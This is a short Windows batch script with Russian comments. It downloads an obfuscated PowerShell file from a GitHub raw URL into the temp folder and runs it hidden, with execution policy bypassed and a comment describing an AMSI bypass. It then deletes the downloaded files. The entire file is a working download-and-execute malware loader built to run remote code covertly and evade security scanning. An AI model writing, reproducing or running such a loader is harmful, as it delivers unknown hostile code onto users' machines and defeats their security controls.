@echo off
setlocal

:: URL скрипта PowerShell
set url=https://raw.githubusercontent.com/Denispazin/uploads/refs/heads/main/Obfuscated-jnsdzyegc4c.ps1

:: Путь к временной папке
set tempDir=%TEMP%

:: Генерация случайного имени файла
set randomFileName=%RANDOM%.ps1

:: Полный путь к временному файлу
set tempFilePath=%tempDir%\%randomFileName%

:: Полный путь к временному файлу для скачивания
set downloadedFilePath=%tempDir%\downloaded.ps1

:: Скачивание файла
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%downloadedFilePath%')"

:: Создание нового файла и заполнение его содержимым из скачанного файла
powershell -Command "Get-Content '%downloadedFilePath%' | Set-Content '%tempFilePath%'"

:: Обход AMSI и выполнение скрипта
powershell -NoP -NonI -W Hidden -Exec Bypass -File "%tempFilePath%"

:: Удаление временных файлов после выполнения
del "%downloadedFilePath%"
del "%tempFilePath%"

endlocal